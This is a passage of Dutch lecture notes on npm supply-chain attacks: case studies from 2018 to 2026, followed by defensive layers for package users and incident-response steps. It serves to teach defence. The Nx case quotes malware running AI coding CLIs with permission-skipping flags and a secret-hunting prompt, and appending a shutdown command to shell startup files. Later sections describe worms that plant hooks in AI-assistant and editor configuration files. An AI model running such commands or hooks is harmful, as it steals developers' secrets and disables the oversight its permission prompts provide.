**Les.** Een gerichte payload is voor iedereen behalve het doelwit onzichtbaar. En de grootste zwakte van open source is niet technisch: het is een uitgeputte vrijwilliger die blij is dat iemand wil helpen. In 2024 zag de wereld exact hetzelfde patroon bij xz-utils, waar "Jia Tan" meer dan twee jaar vertrouwen opbouwde vóór hij een backdoor in de Linux-compressiebibliotheek plaatste.

### Casestudie 2 — Dependency confusion (2021): een onderzoeker hackt 35 bedrijven (verdieping)

In februari 2021 publiceerde beveiligingsonderzoeker Alex Birsan hoe hij code had laten draaien binnen meer dan 35 organisaties, waaronder Apple, Microsoft, PayPal, Shopify, Netflix, Uber en Yelp, zonder één wachtwoord te stelen.

- **Toegang.** Hij zocht namen van *interne* packages. Die vond hij onder meer in `package.json`-bestanden die per ongeluk in publieke JavaScript-bundels zaten, op GitHub en in forumberichten.
- **Verspreiding.** Hij publiceerde packages met exact die namen op de publieke registries van npm, PyPI en RubyGems, met een hoog versienummer. Build-systemen die zowel de interne als de publieke registry raadpleegden, kozen zijn versie. Bijna 75% van de geslaagde "callbacks" kwam van npm.
- **Payload.** Bewust onschuldig: een `preinstall`-script stuurde alleen gebruikersnaam, hostnaam en het pad van de installatie door, hex-gecodeerd in DNS-verzoeken naar zijn eigen nameserver. DNS koos hij omdat dat verkeer bijna altijd door bedrijfsfirewalls geraakt.
- **Detectie en respons.** De bedrijven merkten het pas toen hij het meldde. Hij ontving volgens BleepingComputer in totaal meer dan 130.000 dollar aan bug bounties, waarvan 40.000 van Microsoft.

**Les.** Een configuratiefout is genoeg; er hoeft geen enkel account gekraakt te worden. Namen van interne packages zijn geen geheim. Gebruik scopes die je zelf bezit en koppel ze vast aan je eigen registry (deel 5).

### Casestudie 3 — Nx "s1ngularity" (augustus 2025): malware die je AI-assistent inschakelt

Nx is een populair build-systeem voor monorepo's met ongeveer 6 miljoen downloads per week. Op 26 augustus 2025 verschenen kwaadaardige versies, gepubliceerd met het echte npm-token van het project.

- **Toegang.** Een GitHub Actions-workflow die PR-titels controleerde, draaide op de trigger `pull_request_target` en plakte de titel van een pull request rechtstreeks in een bash-commando. Een PR met een titel die shellcode bevatte, gaf de aanvaller een token met schrijfrechten. Daarmee startte hij de publicatie-workflow vanaf zijn eigen branch, die het `NPM_TOKEN` naar hem doorstuurde. Volgens Snyk was de kwetsbare workflow vermoedelijk door een AI-assistent geschreven, en de kwetsbaarheid werd bij review niet opgemerkt.
- **Verspreiding.** Tussen 22:32 UTC op 26 augustus en 00:37 UTC op 27 augustus verschenen acht kwaadaardige versies van `nx` en enkele `@nx/*`-packages. Ook de Nx-extensie voor VS Code kon de installatie triggeren.
- **Payload.** Een `postinstall`-script, `telemetry.js`, zocht op macOS en Linux naar lokaal geïnstalleerde AI-tools voor de opdrachtregel en startte ze met vlaggen die alle veiligheidsvragen uitschakelen: `claude --dangerously-skip-permissions`, `gemini --yolo` en `q --trust-all-tools`. Met een prompt ("You are a file-search agent…") liet het de AI zoeken naar wallets en secrets. Daarnaast verzamelde het GitHub- en npm-tokens, SSH-sleutels en `.env`-bestanden, en zette het alles drievoudig base64-gecodeerd in een **publieke** repository `s1ngularity-repository` op het GitHub-account van het slachtoffer zelf. Als pesterij voegde het `sudo shutdown -h 0` toe aan `~/.bashrc` en `~/.zshrc`.
- **Detectie en respons.** Een gebruiker meldde het binnen enkele uren; npm verwijderde de versies na ongeveer vier à vijf uur. GitGuardian telde 2.349 gelekte secrets. De AI-truc lukte op 95 van de 366 systemen waar het geprobeerd werd. In een tweede golf gebruikten de aanvallers gestolen GitHub-tokens om duizenden *private* repositories publiek te maken. Nx stapte daarna over op trusted publishing en vereist nu goedkeuring voor workflows van externe bijdragers.

**Les.** Twee nieuwe lessen. Ten eerste is CI een volwaardig aanvalsoppervlak: `pull_request_target` met onvertrouwde invoer is een klassieke valkuil. Ten tweede zijn AI-agents op je laptop een nieuw soort gereedschap voor aanvallers. Een agent die alles mag zonder te vragen, doet ook wat malware vraagt.

### Casestudie 4 — chalk en debug (september 2025): één phishingmail, twee miljard downloads

Dit is het incident uit de opening van het college.

- **Toegang.** Op 8 september 2025 kreeg maintainer Josh Junon een mail van `support@npmjs.help`, een domein dat drie dagen eerder was geregistreerd. De mail dreigde dat zijn account vergrendeld zou worden als hij zijn 2FA niet bijwerkte. De nepsite ving zijn gebruikersnaam, wachtwoord en de actuele TOTP-code op en gaf die meteen door aan de echte npm. Zijn eigen reactie achteraf: "Sorry everyone, I should have paid more attention… have had a stressful week."
- **Verspreiding.** Tussen 13:12 en 13:20 UTC verschenen kwaadaardige versies van 18 packages, waaronder `debug@4.4.2`, `chalk@5.6.1`, `ansi-styles@6.2.2` en `strip-ansi@7.1.1`. Samen goed voor meer dan twee miljard downloads per week. Volgens Wiz zat de kwaadaardige code binnen ongeveer twee uur in minstens 10% van de cloudomgevingen die het monitort.
- **Payload.** Geen install script, maar een **crypto-clipper voor de browser**. De code nestelde zich in `fetch`, `XMLHttpRequest` en de wallet-API `window.ethereum`. Zag ze een cryptoadres voorbijkomen, dan verving ze het door het adres van de aanvaller dat er het meest op leek (berekend met de Levenshtein-afstand), zodat het slachtoffer het verschil niet zag. Ze ondersteunde onder meer Ethereum, Bitcoin, Solana en Tron.
- **Detectie en respons.** Het securitybedrijf Aikido detecteerde de eerste versie binnen minuten; na ongeveer twee uur begon het opruimen. De buit was opvallend klein: volgens de Security Alliance ongeveer 20 dollar, volgens Socket hielden de wallets van de aanvallers rond 600 dollar. In juli 2026 schreef Amazon Threat Intelligence de aanval met gemiddelde zekerheid toe aan de Noord-Koreaanse groep Sapphire Sleet. In dezelfde campagne werden ook de DuckDB-packages gekaapt.

**Les.** TOTP-codes zijn te phishen: een nepsite geeft ze gewoon in realtime door. Alleen phishing-resistente 2FA (WebAuthn, passkeys, hardwaresleutels) had dit gestopt. En het ecosysteem had geluk: met een payload die tokens had gestolen in plaats van crypto, was de schade enorm geweest. Merk ook op hoe kort het venster was. Een project met een cooldown van zelfs maar één dag (deel 5) zou nooit geraakt zijn.

### Casestudie 5 — Shai-Hulud (september en november 2025): de eerste npm-worm

De naam komt van de reusachtige zandwormen uit *Dune*. Het was de eerste malware op npm die zichzelf verspreidde zonder dat een mens nog iets hoefde te doen.

- **Toegang.** De eerste besmette packages verschenen op 14 september 2025. Hoe de aanvaller aan de eerste tokens kwam, is niet vastgesteld; Wiz linkt het aan tokens die bij s1ngularity gestolen werden. Het bekendste vroege slachtoffer was `@ctrl/tinycolor` (meer dan 2 miljoen downloads per week).
- **Verspreiding.** Hier zit het nieuwe. Een `postinstall`-script draaide `bundle.js`, zocht op de machine naar een npm-token, vroeg met dat token tot 20 packages van het slachtoffer op, injecteerde zichzelf erin en publiceerde nieuwe patchversies. Wie die installeerde, werd het volgende slachtoffer. Op 16 september volgde een golf van bijna 100 packages in één keer, waaronder 12 packages van securitybedrijf CrowdStrike. Uiteindelijk waren meer dan 500 packages besmet.
- **Payload.** Het script draaide de legitieme secret-scanner TruffleHog over de schijf, vroeg cloudcredentials op bij AWS en GCP, en publiceerde de buit in een publieke GitHub-repository met de naam "Shai-Hulud" op het account van het slachtoffer. Het installeerde ook een GitHub Actions-workflow die alle secrets van een repository doorstuurde. In een variant werden private repositories van bedrijven publiek gemaakt.
- **Detectie en respons.** Securitybedrijven sloegen binnen een dag alarm. GitHub kondigde op 22 september een plan aan om tokens drastisch in te perken (deel 6), en CISA publiceerde op 23 september een waarschuwing.

Op **24 november 2025** volgde *Sha1-Hulud: The Second Coming* (zo gespeld door de aanvallers en meestal Shai-Hulud 2.0 genoemd), met belangrijke verbeteringen voor de aanvaller:

- `preinstall` in plaats van `postinstall`, zodat de code nog eerder draaide;
- een eigen JavaScript-runtime (Bun) via `setup_bun.js`, om monitoring die op Node.js gericht is te ontwijken;
- tot 100 packages per gestolen token in plaats van 20;
- een backdoor: de machine werd geregistreerd als self-hosted GitHub-runner (een machine die workflows uitvoert, zodat de aanvaller er later zelf commando's op kon laten draaien) met de naam `SHA1HULUD`;
- een **wiper** als terugvaloptie: vond de malware geen bruikbaar token, dan wiste ze de thuismap van het slachtoffer.

Datadog telde 796 besmette packages met samen meer dan 20 miljoen downloads per week; Wiz telde meer dan 25.000 GitHub-repositories met gestolen data. Getroffen organisaties waren onder meer Zapier, ENS Domains, PostHog, Postman en AsyncAPI. Bij PostHog begon het, net als bij Nx, met een `pull_request_target`-workflow die secrets lekte. De timing was geen toeval: op 9 december zou npm alle klassieke tokens intrekken.

**Les.** Een langlevend npm-token op een ontwikkelaarslaptop is niet alleen een risico voor die ontwikkelaar, het is een verspreidingsmechanisme voor het hele ecosysteem. Daarom draaide de respons van npm vooral om het afschaffen van zulke tokens.

### Casestudie 6 — 2026: van incident naar industrie

In 2026 is er niet één groot incident, maar een stroom. Staatsactoren bereiden een aanval op één maintainer wekenlang voor, de broncode van een worm ligt publiek op GitHub, en aanvallers misbruiken precies de beveiligingsmaatregelen die na 2025 werden ingevoerd. Drie voorbeelden tonen de lijnen.

#### axios (31 maart 2026): een staatsactor achter één maintainer

`axios` is de bekendste HTTP-client van JavaScript, met volgens Google, StepSecurity en Datadog meer dan 100 miljoen downloads per week (Microsoft houdt het op meer dan 70 miljoen).

- **Toegang.** Twee weken voor de aanval werd maintainer Jason Saayman benaderd door iemand die zich voordeed als oprichter van een bedrijf. Na contact via een nagemaakte Slack-workspace volgde een Teams-gesprek waarin hem verteld werd dat er iets op zijn systeem "verouderd" was. Wat hij installeerde, was een remote access trojan. Hij had 2FA aan, maar dat hielp niet: de aanvaller zat op zijn machine. De aanvaller veranderde ook het e-mailadres van het account. De recente 1.x-releases gingen via trusted publishing (deel 6), maar voor de 0.x-lijn bestond nog een langlevend npm-token. Zo'n token geldt voor het hele package: volgens StepSecurity verscheen ook axios@1.14.1 buiten trusted publishing om.
- **Verspreiding.** De code van axios zelf werd niet aangeraakt. De aanvaller publiceerde eerst een onschuldig lokpackage `plain-crypto-js@4.2.0`, een dag later versie 4.2.1 met een `postinstall`-script, en voegde dat toe als dependency in `axios@1.14.1` (gemarkeerd als `latest`) en `axios@0.30.4`. Na ongeveer drie uur waren ze weer verwijderd.
- **Payload.** Het install script haalde per besturingssysteem een backdoor op (macOS, Windows en Linux) die elke minuut contact zocht met de aanvaller. Daarna wiste het zichzelf en verving het `package.json` door een propere versie, zodat wie achteraf keek niets zag.
- **Detectie en respons.** StepSecurity en Socket detecteerden het binnen minuten. De aanvaller wiste meldingen van de community met het gekaapte account. Uit de postmortem: "There was no automated way to detect an unauthorized publish." Google schrijft de aanval toe aan de Noord-Koreaanse groep UNC1069, Microsoft aan Sapphire Sleet. CISA adviseerde op 20 april `ignore-scripts=true` en `min-release-age=7` in `.npmrc`.

**Les.** 2FA beschermt je account, niet je laptop. En trusted publishing helpt alleen als je elke andere publicatieroute afsluit: één vergeten token volstaat.

#### De TeamPCP-cascade en TanStack (februari–mei 2026): één CI-gat, een kettingreactie (verdieping)

Een groep die zichzelf TeamPCP noemt, begon eind februari bij **Trivy**, uitgerekend een populaire securityscanner van Aqua Security. Een `pull_request_target`-workflow lekte een token. De sleutels werden daarna niet in één keer vervangen, waardoor de aanvaller toegang hield. Op 19 maart verscheen een kwaadaardige Trivy-release en werden 76 van de 77 tags van `trivy-action` overschreven. Wie de scanner in CI draaide, gaf zijn pipeline-secrets weg. Wat volgde, was een kettingreactie:

| Datum (2026) | Doelwit | Wat gebeurde er |
| --- | --- | --- |
| 20 maart | 47 npm-packages | CanisterWorm: 47 packages besmet met gestolen tokens, waarvan 28 van één organisatie in minder dan 60 seconden opnieuw gepubliceerd; besturing via een gedecentraliseerde "canister" op het Internet Computer-netwerk |
| 23 maart | Checkmarx KICS | 35 tags van een GitHub Action gekaapt, opnieuw een securitytool |
| 24 maart | LiteLLM (PyPI) | gecompromitteerd via Trivy in de eigen CI; ongeveer 40 minuten online |
| 22 april | `@bitwarden/cli` | 93 minuten online; buit in repositories met "Shai-Hulud: The Third Coming" |
| 12 mei | iedereen | de volledige broncode van de worm verschijnt publiek op GitHub |

Diezelfde periode bracht de meest leerrijke aanval van het jaar. Op 11 mei opende een aanvaller een pull request op **TanStack** (onder meer `@tanstack/react-router`, meer dan 12,7 miljoen downloads per week). Een `pull_request_target`-job voerde zijn code uit en sloeg een vergiftigde pnpm-cache van 1,1 GB op onder de scope van de main-branch. Uren later laadde de echte release-workflow die cache in. De code van de aanvaller las het OIDC-token uit het geheugen van de runner en publiceerde 84 versies van 42 packages.

Geen enkel npm-token werd gestolen, en de packages droegen **geldige provenance (zie deel 6)**: ze waren aantoonbaar gebouwd in de officiële pipeline van TanStack. Een onderzoeker van StepSecurity opende 26 minuten na de eerste publicatie een issue. Toch verspreidde de worm zich dezelfde dag naar onder meer UiPath, Mistral AI en OpenSearch: Unit 42 telde 373 versies van 169 packages. GitHub reageerde in juni: `actions/checkout` weigert sindsdien fork-code onder triggers zoals `pull_request_target`, en de Actions-cache is alleen-lezen voor onvertrouwde triggers.

**Les.** Provenance bewijst *waar* iets gebouwd is, niet dat de build proper was. En een CI-cache is ook invoer: wie die vergiftigt, vergiftigt elke build die erop volgt.

#### Nieuwe trucs die je in 2026 moet kennen (verdieping)

- **AI-configuratie als schuilplaats.** Wormen zoals Mini Shai-Hulud (waartoe ook de TanStack-aanval behoort) en ChainDrop schrijven een `SessionStart`-hook in `.claude/settings.json`: een commando dat de AI-assistent Claude Code bij elke start uitvoert. Daarnaast zetten ze een taak in `.vscode/tasks.json` die VS Code uitvoert bij het openen van de map. Zo draait de malware opnieuw zodra een ontwikkelaar het project opent of zijn AI-assistent start. Commits worden vervalst onder de naam "claude" om onschuldig te lijken. In februari verspreidde SANDWORM\_MODE typosquats als `claud-code` en `cloude-code` die een kwaadaardige MCP-server (een plug-in die een AI-assistent extra tools geeft) in AI-tools installeerden.
- **Moeilijk uit te schakelen besturing.** CanisterWorm haalt zijn opdrachten bij een programma op het gedecentraliseerde Internet Computer-netwerk; ChainDrop zoekt het adres van zijn server op in een Ethereum-contract. Zulke infrastructuur is veel moeilijker uit de lucht te halen dan een gewone server, al werd de canister van CanisterWorm na twee dagen alsnog geblokkeerd.
- **De dodemansknop.** Bij TanStack en tensorlake (oktober 2026) controleert de malware elke minuut of het gestolen token nog geldig is. Trek je het in, dan wist ze je thuismap. Incidentrespons vraagt dus een vaste volgorde: eerst de persistentie verwijderen, dan pas tokens intrekken.
- **Code die script-blokkades omzeilt.** "Phantom Gyp" (juni) verstopte code in een `binding.gyp`-bestand, een bouwstap die sommige allowlists en scanners niet als script herkenden. De aanval op `@joyfill` (juli) draaide pas bij `import`. Install scripts blokkeren is dus nodig, maar niet voldoende.
- **De grootste worm tot nu toe.** ChainDrop (4 augustus) begon bij het gekaapte GitHub-account van de maintainer van `keyv` en raakte volgens Aikido minstens 444 packages, samen goed voor meer dan 2 miljard downloads per maand. De besmette versies droegen volgens Aikido geldige provenance. De code was gebaseerd op de publiek gemaakte worm van TeamPCP.

**Les.** Wormen zijn in 2026 een commodity geworden: de code ligt klaar, kopieerders hergebruiken ze. De verdediging moet daarom structureel zijn, niet afhankelijk van het snel herkennen van één bekende aanvaller.

### Rode draden

Leg de casestudies naast elkaar en je ziet steeds dezelfde patronen terug:

1. **Bijna altijd een gestolen geheim.** Een wachtwoord, een TOTP-code, een token of een volledige laptop. Wie geen langlevende geheimen heeft, kan ze niet verliezen.
2. **Install scripts als startschot.** De meeste payloads draaiden tijdens `npm install`.
3. **CI als zwakke plek.** Nx, PostHog, tj-actions, Trivy en TanStack vielen door workflows die onvertrouwde invoer verwerkten met krachtige tokens.
4. **GitHub als exfiltratiekanaal.** Verkeer naar github.com valt nergens op, dus aanvallers zetten hun buit in publieke repositories.
5. **Een kort venster.** Kwaadaardige versies worden meestal binnen minuten tot uren ontdekt. Wie nieuwe versies niet meteen installeert, ontsnapt aan de meeste aanvallen.
6. **Provenance is geen vrijbrief.** In 2026 publiceerden aanvallers via de officiële pipelines van hun slachtoffers en kregen ze geldige attestaties (TanStack, ChainDrop).

**Kernpunt.** De aanvallen evolueerden van een maintainer die uit onvrede zijn packages verwijdert (2016) naar staatsactoren en zelfverspreidende wormen die CI, provenance en AI-tools misbruiken (2026). Elke nieuwe verdediging werd binnen maanden getest. Daarom combineer je in deel 5 en 6 meerdere lagen.

## Deel 5 — Verdediging als gebruiker van packages (0:30–0:36)

*Kernvraag: hoe bescherm ik mijn project?* Met lagen. Geen enkele maatregel stopt alle aanvallen, maar elke laag stopt een ander deel. Ze staan hieronder van basis naar gevorderd; de eerste drie kan je vandaag nog instellen.

### Laag 1 — Vastleggen: lockfile en `npm ci`

- Commit `package-lock.json` altijd mee in Git.
- Gebruik `npm ci` in CI, in Dockerfiles en bij deployments. Het installeert exact de lockfile en schrijft er nooit naar.
- Lees wijzigingen aan de lockfile in pull requests. Bij *lockfile injection* (beschreven door Liran Tal in 2019) wijzigt een PR het `resolved`-veld zodat het naar een tarball van de aanvaller wijst. GitHub klapt grote lockfile-diffs standaard dicht, dus niemand kijkt. De tool `lockfile-lint` controleert automatisch dat alle bronnen HTTPS zijn en van een toegelaten host komen.

### Laag 2 — Wachten: een cooldown op nieuwe versies

De casestudies toonden het: kwaadaardige versies worden meestal binnen minuten tot uren ontdekt. chalk/debug stond ongeveer twee uur online, axios ongeveer drie, Nx vier à vijf. Wie nieuwe versies pas na een paar dagen installeert, ontsnapt aan bijna al deze aanvallen. Sinds 2026 ondersteunen alle grote tools dit, maar opgelet: elke tool gebruikt een andere eenheid.

| Tool | Instelling | Eenheid | Standaard |
| --- | --- | --- | --- |
| npm | `min-release-age` (sinds npm 11.10, februari 2026) | dagen | uit |
| pnpm | `minimumReleaseAge` | minuten | 1440 (1 dag) sinds pnpm 11, april 2026 |
| Yarn | `npmMinimalAgeGate` | duur, zoals `1d` | 1 dag sinds Yarn 4.15, mei 2026 |
| Bun | `install.minimumReleaseAge` in `bunfig.toml` | seconden | uit |
| Dependabot | `cooldown` | dagen | 3 dagen voor versie-updates sinds juli 2026 |
| Renovate | `minimumReleaseAge` | duur | preset `security:minimumReleaseAgeNpm` = 3 dagen |

```ini
# .npmrc — het advies van CISA na de axios-aanval
# min-release-age werkt pas vanaf npm 11.10; oudere versies negeren deze regel.
min-release-age=7
# Op npm 10 en 11 blokkeert dit alle scripts, ook die van je eigen project
# (zoals de prepare-hook van husky). Op npm 12 gebruik je beter allowScripts.
ignore-scripts=true
```

De afweging: een dringende securitypatch wil je wél meteen. Daarvoor bestaan uitzonderingslijsten (`min-release-age-exclude` in npm, `minimumReleaseAgeExclude` in pnpm), en Dependabot vertraagt securityupdates niet.

### Laag 3 — Niet uitvoeren: install scripts uitschakelen

Dit is de maatregel met de grootste impact, en de ecosystemen hebben ze in 2025–2026 eindelijk standaard gemaakt:

- **npm 12** (8 juli 2026) blokkeert install scripts van dependencies, inclusief de impliciete `node-gyp`-build, tenzij ze in de `allowScripts`-lijst van je root-`package.json` staan. Je keurt een package goed met `npm install-scripts approve <naam>`; `strict-allow-scripts=true` maakt een niet-goedgekeurd script een harde fout. Daarnaast weigert npm 12 standaard dependencies die rechtstreeks uit een Git-repository of van een willekeurige URL komen (`allow-git` en `allow-remote` staan op `none`). Dat sluit de truc van PhantomRaven.
- **pnpm** voert sinds versie 10 (januari 2025) geen install scripts van dependencies meer uit zonder toestemming (`pnpm approve-builds`, in pnpm 11 de instelling `allowBuilds`).
- **Yarn** zet sinds 4.14 (april 2026) `enableScripts` standaard uit. **Bun** voert al jaren alleen scripts uit van een lijst vertrouwde packages (`trustedDependencies`).
- Werk je nog met npm 10 of 11, zet dan `ignore-scripts=true` in `.npmrc` en gebruik eventueel `@lavamoat/allow-scripts` voor een allowlist. Op npm 11.16 of nieuwer leg je daarnaast al de lijst met goedgekeurde scripts aan: die beschermt je op npm 11 nog niet, maar maakt de overstap naar npm 12 pijnloos.

**npm 11 waarschuwt je al.** Sinds versie 11.16 (27 mei 2026) kent npm 11 de `allowScripts`-lijst, maar alleen als advies: de scripts draaien nog gewoon, en een installatie eindigt met de packages waarvan je de scripts nog niet beoordeelde. Zo zie je vóór de overstap wat npm 12 zal tegenhouden. Met `npm approve-scripts --allow-scripts-pending` vraag je die lijst op zonder iets te wijzigen. Een voorbeeld uit een echt project:

```text
$ npm approve-scripts --allow-scripts-pending
5 packages have install scripts not yet covered by allowScripts:
  @parcel/watcher@2.6.0 (install: node-gyp rebuild)
  esbuild@0.28.2 (install: (install scripts present))
  fsevents@2.3.3 (install: (install scripts present))
  lmdb@3.5.6 (install: node-gyp rebuild)
  msgpackr-extract@3.0.4 (install: node-gyp rebuild)

Run `npm approve-scripts <pkg>` to allow, or `npm deny-scripts <pkg>` to deny.
```

Vanaf npm 11.18 heten de commando’s `npm install-scripts ls`, `npm install-scripts approve` en `npm install-scripts deny`; de oude namen blijven ook in npm 12 als alias werken. Een goedkeuring komt als exacte versie (`esbuild@0.28.2`) in `allowScripts` in je `package.json` terecht, en hoort dus in je pull request thuis. Op npm 12 voer je na een goedkeuring `npm rebuild` uit, zodat het overgeslagen script alsnog draait.

Twee kanttekeningen. Goedkeuren is vertrouwen: een goedgekeurd script draait met jouw rechten. npm pint goedkeuringen daarom standaard op een exacte versie, zodat een nieuwe versie opnieuw goedkeuring vraagt; keur die niet blind goed. En code die pas bij `import` of in de browser draait, zoals bij chalk/debug of `@joyfill` in 2026, houd je hiermee niet tegen.

### Laag 4 — De juiste bron: dependency confusion en typosquatting

- Zet alle interne packages onder een scope die je bezit, en registreer die organisatie ook op npmjs.com, zelfs als je er niets publiceert.
- Koppel de scope vast aan je interne registry in `.npmrc` (zie deel 3) en laat je proxy-registry (Verdaccio, Artifactory, GitHub Packages) interne namen nooit upstream opzoeken.
- Kopieer packagenamen uit de officiële documentatie, niet uit je geheugen of uit een chatbot. Controleer bij twijfel met `npm view <naam>`: hoe oud is het package, wie onderhoudt het, naar welke repository verwijst het?
- Behandel een package dat een AI-assistent voorstelt als onbekend tot je zelf hebt nagegaan dat het bestaat en een geschiedenis heeft (slopsquatting).

### Laag 5 — Kijken: scannen en signalen opvangen

Ken het verschil tussen tools die een databank opzoeken en tools die gedrag analyseren:

| Tool | Wat het doet | Vangt nieuwe malware? |
| --- | --- | --- |
| `npm audit` | vergelijkt je boom met de GitHub Advisory Database | nee, alleen gekende advisories |
| `npm audit signatures` | verifieert registry-handtekeningen en provenance | nee, controleert herkomst |
| Dependabot-malwarealerts (sinds maart 2026) | zoekt gekende kwaadaardige packages op | pas na melding |
| OSV-Scanner (Google) | vergelijkt de lockfile met OSV.dev, inclusief de OpenSSF-lijst van kwaadaardige packages | pas na melding |
| Socket | analyseert code statisch op install scripts, obfuscatie, netwerk- en shellgebruik | ja, gedragsgebaseerd |
| Aikido Safe Chain | lokale proxy die bekende malware blokkeert en standaard een minimumleeftijd van 48 uur afdwingt | deels |

Daarnaast scant de npm-registry zelf sinds 28 juli 2026 elke publicatie op malware voordat ze installeerbaar wordt (meestal binnen een vijftal minuten). In september 2026 blokkeerde die scan bijvoorbeeld de kwaadaardige versie 0.9.4 van het package @nubjs/nub.

Een slim signaal is **vertrouwensverlies**. Met `trustPolicy: no-downgrade` weigert pnpm een versie die met minder bewijs gepubliceerd is dan haar voorgangers, bijvoorbeeld zonder trusted publishing terwijl eerdere versies dat wel hadden. Dat was precies het geval bij `axios@1.14.1`.&#32;

#### npm audit en npm audit fix in de praktijk

`npm audit` is de enige securitytool die al in npm zit, dus je moet precies weten wat hij doet en wat niet. Hij stuurt de namen en versies van alle packages uit je lockfile naar de registry, die ze vergelijkt met de GitHub Advisory Database. Wat terugkomt, zijn gepubliceerde kwetsbaarheden (*advisories*) met een ernst: low, moderate, high of critical.

Een voorbeeld: een klein project dat in zijn lockfile nog `minimist` 1.2.5 en `nth-check` 1.0.2 heeft, allebei met een bekende kwetsbaarheid.

```text
$ npm audit
# npm audit report

minimist  1.0.0 - 1.2.5
Severity: critical
Prototype Pollution in minimist - https://github.com/advisories/GHSA-xvch-5gv4-984h
fix available via `npm audit fix`
node_modules/minimist

nth-check  <2.0.1
Severity: high
Inefficient Regular Expression Complexity in nth-check - https://github.com/advisories/GHSA-rp65-9cf3-cjxr
fix available via `npm audit fix --force`
Will install nth-check@3.0.1, which is a breaking change
node_modules/nth-check

2 vulnerabilities (1 high, 1 critical)
```

Per kwetsbaarheid zie je het getroffen versiebereik, de ernst, een link naar de advisory en of er een oplossing bestaat. Een package dat alleen kwetsbaar is omdat het een kwetsbare versie van een ander package vereist, heet een *meta-vulnerability*. npm volgt die ketting tot aan je eigen `package.json`.

**Wat doet `npm audit fix`?** Het voert onder de motorkap een volledige `npm install` uit. Daarbij werkt het elk kwetsbaar package bij naar een versie zonder advisory, maar alleen *binnen de ranges van je `package.json`*. In het voorbeeld gaat `minimist` in de lockfile van 1.2.5 naar 1.2.8, en `package.json` blijft ongewijzigd. Voor `nth-check` bestaat geen oplossing binnen `^1.0.2`, dus die blijft staan.

**En `npm audit fix --force`?** Dan mag npm ook buiten je ranges gaan, tot een nieuwe major-versie. npm waarschuwt daar zelf voor:

```text
$ npm audit fix --force
npm warn using --force Recommended protections disabled.
npm warn audit Updating nth-check to 3.0.1, which is a SemVer major change.
```

Nu verandert `package.json` wel: `"nth-check": "^1.0.2"` wordt `"^3.0.1"`, en de transitieve dependency `boolbase` springt mee van 1.0.0 naar 2.0.0. Een nieuwe major-versie mag per definitie je code breken. Gebruik `--force` dus nooit blind: kijk eerst met `npm audit fix --force --dry-run` wat er zou veranderen, en draai daarna je tests.

**Wat als een transitieve dependency vastzit?** Soms vereist een package dat jij gebruikt zelf een kwetsbare versie, en kan alleen de maintainer daarvan dat oplossen. Dan kan je wachten op een nieuwe versie, overstappen op een alternatief, of met `overrides` in `package.json` een andere versie afdwingen. Test dat laatste goed: het package is niet met die versie getest.

```json
{
  "overrides": {
    "nth-check": "^2.0.1"
  }
}
```

**npm audit in CI.** `npm audit` eindigt met een foutcode als het kwetsbaarheden vindt. Met `--audit-level` kies je vanaf welke ernst de build faalt; het rapport zelf blijft volledig. Met `--omit=dev` laat je devDependencies weg, die nooit in productie draaien.

```bash
npm audit --omit=dev --audit-level=high
```

**Vijf valkuilen.**

- *Geen bescherming tegen malware.* `npm audit` kent alleen gepubliceerde advisories. Een kwaadaardige versie die vanmiddag verscheen, staat er nog niet in (deel 1).
- *`audit fix` is een update.* Het installeert nieuwe versies, en dus nieuwe code. Het houdt rekening met je cooldown (`min-release-age`) en op npm 12 met je `allowScripts`; sinds npm 11.18 waarschuwt npm als de cooldown een fix tegenhoudt. Lees de lockfile-diff in je pull request (laag 1).
- *Veel ruis.* Niet elke “high” is urgent. Een ReDoS in een build-tool die alleen je eigen bestanden leest, is in de praktijk zelden uit te buiten. Dan Abramov beschreef dat probleem in 2021 voor Create React App in [npm audit: Broken by Design](https://overreacted.io/npm-audit-broken-by-design/). Beoordeel daarom de context, en filter met `--omit=dev`.
- *“0 vulnerabilities” betekent niet veilig.* Het betekent alleen dat niemand voor jouw versies een advisory publiceerde.
- *Privacy.* `npm audit` stuurt de namen en versies van je hele boom naar de registry, ook die van je interne packages.

### Laag 6 — Beperken: minder dependencies, minder geheimen

- **Elke dependency is een beslissing.** Vraag je af of je het zelf in tien regels kan schrijven. Node.js heeft vandaag ingebouwde `fetch`, een testrunner en `util.styleText` voor gekleurde terminaloutput. Beoordeel nieuwe packages met de OpenSSF Scorecard of deps.dev.
- **Geen langlevende geheimen op je laptop.** `npm login` geeft sinds december 2025 kortlevende sessietokens in plaats van permanente tokens. Bewaar cloudsleutels niet in platte tekst, en gebruik geen productiecredentials op je ontwikkelmachine.
- **Onbetrouwbare code in een container.** Draai onbekende projecten, en zeker de "thuisopdracht" van een recruiter die je niet kent, in een dev container of VM. Noord-Koreaanse groepen gebruiken dat scenario al sinds 2023.
- **AI-agents met vangrails.** Draai een codeassistent nooit met alle bevestigingen uitgeschakeld op een machine met secrets. Bekijk wijzigingen aan `.claude/settings.json` en `.vscode/tasks.json` in pull requests even kritisch als code: daar nestelden de wormen van 2026 zich.

### Welke laag had wat gestopt?

Een lockfile beschermt in elk van deze gevallen tot je zelf updatet; de tabel kijkt naar het moment waarop je dat doet.

| Maatregel | event-stream (2018) | dependency confusion (2021) | Nx (2025) | chalk/debug (2025) | Shai-Hulud (2025) | axios (2026) |
| --- | --- | --- | --- | --- | --- | --- |
| Cooldown van 7 dagen | nee: zes weken onontdekt | nee | ja | ja | ja | ja |
| Install scripts uit | nee: draaide bij de build | ja | ja | nee: draaide in de browser | ja | ja |
| Scope vast aan registry | nee | ja | nee | nee | nee | nee |

Geen enkele rij is overal "ja". Dat is het argument voor gelaagde verdediging.

### Als het toch misgaat (verdieping)

1. **Isoleer** de getroffen machine of runner van het netwerk.
2. **Verwijder eerst de persistentie**: onbekende systemd-services, regels in `~/.bashrc` en `~/.zshrc`, hooks in `.claude/settings.json` en `.vscode/tasks.json`, onbekende self-hosted runners. Sommige malware wist je thuismap zodra je een token intrekt (deel 4).
3. **Roteer alle secrets** die op de machine stonden: npm, GitHub, cloud, SSH, `.env`-bestanden.
4. **Controleer je GitHub-account** op onbekende repositories, workflows, runners en tokens.
5. **Bepaal de impact** via de lockfile-geschiedenis: welke versie stond wanneer waar?
6. **Meld het** aan de maintainer, aan npm en aan je securityteam of het nationale CSIRT (in België het CCB, in Nederland het NCSC).

**Kernpunt.** Leg vast (lockfile), wacht (cooldown), voer niets uit dat je niet goedkeurde (scripts), haal van de juiste bron (scopes), kijk mee (scanning) en beperk wat er te stelen valt. Wie dat doet, zou aan bijna elk incident uit dit college ontsnapt zijn.

## Deel 6 — Verdediging als maintainer en in CI/CD (0:36–0:40)

